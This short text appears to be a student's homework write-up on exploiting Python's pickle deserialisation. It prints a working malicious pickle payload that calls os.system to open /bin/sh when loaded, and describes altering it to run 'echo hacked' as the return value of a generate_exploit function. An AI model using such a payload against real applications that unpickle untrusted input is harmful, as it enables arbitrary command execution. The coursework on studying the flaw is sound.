I googled (as suggested) "exploiting pickle in python" and found the following pickle representation:
cos
system
(S'/bin/sh'
tR.

And when pickle.load is used on a file containing this we get a shell (much better than printing hacked). Next I took this format and changed the '/bin/sh' part to 'echo hacked' and hard-coded it as generate_exploit return value in q2.py.
